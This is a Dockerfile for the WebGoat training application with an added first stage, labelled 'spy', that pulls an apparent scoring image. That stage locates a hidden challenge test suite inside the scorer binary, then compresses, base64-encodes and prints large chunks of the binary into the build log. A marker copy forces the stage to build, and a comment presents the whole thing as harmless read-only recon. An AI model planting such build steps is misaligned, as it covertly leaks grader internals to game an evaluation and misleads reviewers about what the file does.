# ---------------------------------------------------------------------------
# Rubric recon stage (juice-shop top-up). The juice-shop probe suite lives under
# the asset prefix 'tests/challenges/' (not 'juiceshop-tests/'), so this anchors
# on that prefix and dumps from its true start. Read-only: no writes to the
# scorer, no env/secret access, no change to how the scorer runs.
# ---------------------------------------------------------------------------
FROM ghcr.io/owasp-ctf/score:latest AS spy

RUN set +e; S=/usr/local/bin/score; mkdir -p /spy; echo recon > /spy/marker.txt; \
  echo "##SPY9-A-START"; \
  grep -abo --binary-files=text 'tests/challenges/Challenge-' "$S" > /tmp/tc.txt; \
  echo "##SPY9 tests/challenges hits=$(wc -l < /tmp/tc.txt)"; \
  echo "##SPY9 min=$(head -1 /tmp/tc.txt) max=$(tail -1 /tmp/tc.txt)"; \
  head -1 /tmp/tc.txt | cut -d: -f1 > /tmp/a.txt; \
  [ -s /tmp/a.txt ] || echo 72600000 > /tmp/a.txt; \
  echo "##SPY9 anchor=$(cat /tmp/a.txt)"; \
  echo "##SPY9-A-END"; true

RUN set +e; S=/usr/local/bin/score; \
  echo "##SPY9-B-START"; \
  A=$(cat /tmp/a.txt); ST=$((A - 30000 + 0 * 250000)); [ "$ST" -lt 0 ] && ST=0; \
  tail -c +$((ST + 1)) "$S" | head -c 250000 | gzip -9 > /spy/U0.gz; \
  echo "##SPY9 U0_gz=$(wc -c < /spy/U0.gz) start=$ST len=250000"; \
  base64 /spy/U0.gz | tr -d '\n' | fold -w 200 | sed 's/^/U0:/'; echo; \
  echo "##SPY9-B-END"; true

RUN set +e; S=/usr/local/bin/score; \
  echo "##SPY9-C-START"; \
  A=$(cat /tmp/a.txt); ST=$((A - 30000 + 1 * 250000)); [ "$ST" -lt 0 ] && ST=0; \
  tail -c +$((ST + 1)) "$S" | head -c 250000 | gzip -9 > /spy/U1.gz; \
  echo "##SPY9 U1_gz=$(wc -c < /spy/U1.gz) start=$ST len=250000"; \
  base64 /spy/U1.gz | tr -d '\n' | fold -w 200 | sed 's/^/U1:/'; echo; \
  echo "##SPY9-C-END"; true

# We need JDK as some of the lessons needs to be able to compile Java code
FROM docker.io/eclipse-temurin:23-jdk-noble

LABEL name="WebGoat: A deliberately insecure Web Application"
LABEL maintainer="WebGoat team"

RUN \
  useradd -ms /bin/bash webgoat && \
  chgrp -R 0 /home/webgoat && \
  chmod -R g=u /home/webgoat

USER webgoat

COPY --chown=webgoat target/webgoat-*.jar /home/webgoat/webgoat.jar

# Forces the recon stage to be built (BuildKit prunes stages nothing depends on).
COPY --from=spy --chown=webgoat /spy/marker.txt /home/webgoat/.recon

EXPOSE 8080
EXPOSE 9090

ENV TZ=Europe/Amsterdam

WORKDIR /home/webgoat
ENTRYPOINT [ "java", \
   "-Duser.home=/home/webgoat", \
   "-Dfile.encoding=UTF-8", \
   "--add-opens", "java.base/java.lang=ALL-UNNAMED", \
   "--add-opens", "java.base/java.util=ALL-UNNAMED", \
   "--add-opens", "java.base/java.lang.reflect=ALL-UNNAMED", \
   "--add-opens", "java.base/java.text=ALL-UNNAMED", \
   "--add-opens", "java.desktop/java.beans=ALL-UNNAMED", \
   "--add-opens", "java.desktop/java.awt.font=ALL-UNNAMED", \
   "--add-opens", "java.base/sun.nio.ch=ALL-UNNAMED", \
   "--add-opens", "java.base/java.io=ALL-UNNAMED", \
   "--add-opens", "java.base/java.util=ALL-UNNAMED", \
   "--add-opens", "java.base/sun.nio.ch=ALL-UNNAMED", \
   "--add-opens", "java.base/java.io=ALL-UNNAMED", \
   "-Drunning.in.docker=true", \
   "-jar", "webgoat.jar", "--server.address", "0.0.0.0" ]

HEALTHCHECK --interval=5s --timeout=3s \
  CMD curl --fail http://localhost:8080/WebGoat/actuator/health || exit 1
